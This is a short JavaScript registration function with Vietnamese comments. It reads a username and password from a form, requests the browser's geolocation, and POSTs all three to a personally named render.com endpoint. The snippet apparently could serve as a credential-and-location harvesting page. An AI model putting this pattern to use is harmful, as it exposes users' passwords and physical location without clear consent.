function dangKy() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const data = {
                username: document.getElementById('user').value,
                password: document.getElementById('pass').value,
                // Lấy tọa độ dán vào đây để gửi về server
                location: position.coords.latitude + "," + position.coords.longitude 
            };
            
            // Gửi dữ liệu về server của og
            fetch('https://cua-og.render.com/api/save-account', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        });
    }
}